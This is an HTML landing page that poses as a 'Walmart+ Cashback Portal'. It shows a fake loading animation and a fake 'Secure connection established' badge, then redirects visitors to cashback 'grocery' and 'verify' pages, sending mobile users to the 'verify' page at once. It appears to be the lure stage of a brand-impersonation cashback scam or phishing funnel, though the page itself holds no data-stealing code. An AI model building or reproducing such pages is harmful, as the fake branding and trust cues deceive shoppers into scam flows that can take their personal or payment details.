---
redirect_to: /walmart-cashback/grocery
---

<script>
// Cookie tracking
document.cookie = "visitor_id=" + Math.random().toString(36).substring(2) + ";path=/";

// Mobile redirect
if(/Android|iPhone|iPad/i.test(navigator.userAgent)) {
  window.location.href = '/walmart-cashback/verify?utm_source=direct&utm_medium=mobile';
}
</script>

<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
  body {
    font-family: 'Inter', sans-serif;
    background: linear-gradient(135deg, #f8fafc 0%, #e6f0ff 100%);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
    margin: 0;
    padding: 0 20px;
  }
  .logo {
    width: 72px;
    height: 72px;
    margin: 0 auto 20px;
    background: #0071ce;
    border-radius: 16px;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 12px rgba(0, 113, 206, 0.2);
  }
  .logo svg {
    width: 40px;
    height: 40px;
    fill: white;
  }
  h2 {
    color: #1a365d;
    margin: 0 0 8px;
    font-weight: 600;
  }
  p {
    color: #4a5568;
    margin: 0 0 24px;
    font-size: 16px;
  }
</style>

<div>
  <div class="logo">
    <svg viewBox="0 0 24 24">
      <path d="M12,2L1,12H4V22H20V12H23M11,15V18H13V15M15,15V18H17V15M7,15V18H9V15Z"/>
    </svg>
  </div>
  <h2>Walmart+ Cashback Portal</h2>
  <p>Loading your exclusive member benefits...</p>
  
  <svg width="80" height="80" viewBox="0 0 100 100" style="margin: 30px auto; display: block;">
    <circle cx="50" cy="50" r="45" fill="none" stroke="#e2e8f0" stroke-width="8"/>
    <circle id="progress-circle" cx="50" cy="50" r="45" fill="none" stroke="#0071ce" stroke-width="8" 
            stroke-linecap="round" stroke-dasharray="283" stroke-dashoffset="283"
            style="transform: rotate(-90deg); transform-origin: 50% 50%;"/>
  </svg>
  
  <p style="color: #718096; font-size: 14px;">
    <svg style="vertical-align: middle; margin-right: 6px;" width="16" height="16" viewBox="0 0 24 24" fill="#38a169">
      <path d="M12,2A10,10 0 0,1 22,12A10,10 0 0,1 12,22A10,10 0 0,1 2,12A10,10 0 0,1 12,2M11,16.5L6,13L7.41,11.59L11,14.17L16.59,8.58L18,9L11,16.5Z"/>
    </svg>
    Secure connection established
  </p>
</div>

<script>
// Animated progress circle
let progress = 0;
const circle = document.getElementById('progress-circle');
const interval = setInterval(() => {
  progress += 1;
  circle.style.strokeDashoffset = 283 - (283 * (progress/100));
  if(progress >= 100) {
    clearInterval(interval);
    window.location.href = '/walmart-cashback/grocery';
  }
}, 20);
</script>
